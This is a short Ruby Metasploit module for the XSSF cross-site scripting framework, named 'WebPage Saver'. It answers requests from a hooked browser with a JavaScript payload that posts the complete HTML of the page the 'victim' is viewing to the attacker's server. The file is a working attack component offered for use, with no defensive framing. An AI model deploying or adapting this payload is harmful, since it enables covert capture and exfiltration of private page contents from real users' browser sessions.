require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'WebPage Saver',
			'Description' => 'Saves curent page viewed by the victim'
		))
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		send_response(cli, %Q{ XSSF_POST(document.documentElement.innerHTML, '#{self.name}'); })
	end
end